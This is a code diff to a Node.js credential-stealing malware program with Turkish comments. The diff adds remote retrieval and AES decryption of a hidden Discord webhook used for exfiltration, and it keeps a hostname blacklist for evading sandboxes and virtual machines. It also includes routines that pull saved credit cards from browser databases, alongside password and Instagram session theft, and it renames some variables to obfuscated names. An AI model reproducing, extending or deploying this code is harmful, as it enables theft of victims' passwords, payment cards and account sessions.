@@ -11,8 +11,6 @@ const execPromise = promisify(exec);
 const crypto = require('crypto');
 const sqlite3 = require('sqlite3');
 const util = require('util');
-const dpapi = require('dpapi');
-
 function getLocale() {
     return Intl.DateTimeFormat().resolvedOptions().locale.slice(0, 2).toUpperCase();
 }
@@ -30,7 +28,105 @@ const url = 'BINDER-LINK-HERE';
 const botToken = 'YOURBOTTOKEN';
 const chatId = 'YOURCHATID';
 
-const discordWebhookUrl = 'REMPLACE_ME';
+let discordWebhookUrl = null;
+let basewebhookurl = 'REMPLACE-ME-OC';
+
+async function decryptText(encryptedBase64, ivBase64, keyBase64) {
+    const encryptedArray = base64ToArrayBuffer(encryptedBase64);
+    const iv = base64ToArrayBuffer(ivBase64);
+    const key = await importKey(keyBase64);
+
+    const decrypted = await crypto.subtle.decrypt(
+        {
+            name: "AES-GCM",
+            iv: iv,
+        },
+        key,
+        encryptedArray
+    );
+
+    const decoder = new TextDecoder();
+    return decoder.decode(decrypted);
+}
+
+function base64ToArrayBuffer(base64) {
+    const buffer = Buffer.from(base64, 'base64');
+    return buffer.buffer.slice(buffer.byteOffset, buffer.byteOffset + buffer.byteLength);
+}
+
+async function importKey(keyBase64) {
+    const rawKey = base64ToArrayBuffer(keyBase64);
+    return await crypto.subtle.importKey(
+        "raw",
+        rawKey,
+        { name: "AES-GCM" },
+        true,
+        ["encrypt", "decrypt"]
+    );
+}
+
+// Axios ile veri alma fonksiyonu
+async function fetchData(url) {
+    try {
+        const response = await axios.get(url);
+        return response.data; // Axios'da text() yerine data döner
+    } catch (error) {
+        console.error("Veri alınırken hata oluştu:", error);
+    }
+}
+
+async function fetchAndDecrypt() {
+
+    const encryptedUrl = `${basewebhookurl}/jacob`;
+    const ivUrl = `${basewebhookurl}/mayo`;
+    const keyUrl = `${basewebhookurl}/tenk`;
+
+    try {
+        const encryptedBase64 = await fetchData(encryptedUrl);
+        const ivBase64 = await fetchData(ivUrl);
+        const keyBase64 = await fetchData(keyUrl);
+
+        if (encryptedBase64 && ivBase64 && keyBase64) {
+            const decryptedUrl = await decryptText(encryptedBase64, ivBase64, keyBase64);
+            discordWebhookUrl = decryptedUrl; // Global değişkeni güncelle
+            console.log("Webhook URL çözüldü ve kaydedildi:", discordWebhookUrl);
+        } else {
+            console.error("Gerekli veriler alınamadı.");
+        }
+    } catch (error) {
+        console.error("Bir hata oluştu:", error);
+    }
+}
+
+// Uygulama başlatıldığında veriyi çöz
+(async () => {
+    await fetchAndDecrypt();
+
+    if (discordWebhookUrl) {
+        console.log("Webhook URL kullanıma hazır:", discordWebhookUrl);
+        const payload = {
+            content: "Mesaj içeriği"
+        };
+        await sendWebhook(payload);
+    } else {
+        console.error("Webhook URL alınamadı.");
+    }
+})();
+
+// Webhook gönderme fonksiyonu
+async function sendWebhook(payload) {
+    if (discordWebhookUrl) {
+        try {
+            await axios.post(discordWebhookUrl, payload);
+            console.log('Webhook gönderildi');
+        } catch (error) {
+            console.error(`Webhook gönderilirken hata oluştu: ${error.message}`);
+        }
+    } else {
+        console.error("Webhook URL henüz tanımlanmadı.");
+    }
+}
+
 const discordWebhookUr1 = discordWebhookUrl;
 
 const blackListedHostname = ["BEE7370C-8C0C-4", "AppOnFly-VPS","tVaUeNrRraoKwa", "vboxuser", "fv-az269-80", "DESKTOP-Z7LUJHJ", "DESKTOP-0HHYPKQ", "DESKTOP-TUAHF5I",  "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC", "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH", ]
@@ -1344,10 +1440,10 @@ async function SubmitInstagram(session_id) {
     };
 
     /*await axios.post(discordWebhookUr1, { embeds: [embed] });
-
+*/
     // Introduce a 2-second delay before sending the second webhook request
     await new Promise(resolve => setTimeout(resolve, 1000));
-*/
+
     // Retry logic with exponential backoff
     let retryAttempts = 0;
     while (retryAttempts < 3) { // Retry a maximum of 3 times
@@ -2327,9 +2423,7 @@ async function getEncrypted() {
             browserPath[_0x4c3514].push(_0x2ed7ba)
         } catch (_0x32406b) {}
     }
-}}
-
-
+}
 
 
 function addFolder(folderPath) {
@@ -3594,9 +3688,8 @@ async function getPasswords() {
 }
 
 
-
 async function getCards() {
-  const results = [];
+  const _0x540754 = [];
 
   for (let _0x261d97 = 0; _0x261d97 < browserPath.length; _0x261d97++) {
     if (!fs.existsSync(browserPath[_0x261d97][0])) {
@@ -3631,7 +3724,7 @@ async function getCards() {
               const _0x5e1041 = card.card_number_encrypted ? card.card_number_encrypted.slice(3, 15) : '';
               const decryptedCardNumber = subModules.decryption(card.card_number_encrypted, key);
               const cardInfo = `${decryptedCardNumber}\t${month}/${card.expiration_year}\t${card.name_on_card}\n`;
-              results.push(cardInfo);
+              _0x540754.push(cardInfo);
             } catch (error) {}
           }
         },
@@ -3647,18 +3740,18 @@ async function getCards() {
     } catch (error) {}
   }
 
-  if (results.length === 0) {
-    results.push('no cards found');
+  if (_0x540754.length === 0) {
+    _0x540754.push('no cards found');
   }
 
-  if (results.length) {
+  if (_0x540754.length) {
     const cardsFolderPath = path.join(mainFolderPath, 'Cards');
     if (!fs.existsSync(cardsFolderPath)) {
       fs.mkdirSync(cardsFolderPath);
     }
 
     const cardsFilePath = path.join(cardsFolderPath, 'Cards.txt');
-    fs.writeFileSync(cardsFilePath, user.copyright + results.join(''), {
+    fs.writeFileSync(cardsFilePath, user.copyright + _0x540754.join(''), {
       encoding: 'utf8',
       flag: 'a+',
     });
